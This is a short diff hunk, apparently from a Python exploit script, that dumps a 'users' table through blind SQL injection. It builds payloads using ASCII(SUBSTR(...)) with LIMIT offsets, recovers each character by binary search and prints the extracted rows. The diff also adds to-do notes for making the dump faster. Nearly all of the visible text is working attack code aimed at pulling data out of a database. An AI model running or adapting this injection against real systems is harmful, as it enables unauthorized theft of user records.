@@ -139,10 +139,12 @@ for row_index in range(0, row_count):
     row = []
     for column_name in columns:
         name = []
-        # Improvement can be made by calculating the record length instead using a fixed value
         for row_name_index in range(1, 33):
             injection = build_injection(f"1' AND (SELECT ASCII(SUBSTR({column_name}, {row_name_index}, 1)) FROM users LIMIT {row_index}, 1)")
             name.append(chr(binary_search(injection)))
         row.append("".join(name).rstrip())
     print(f"\t{row}")
 
+# Performance improvements to be made:
+## 1. Async requests
+## 2. For the data dump, calculate the record length instead of using a fixed value (32)
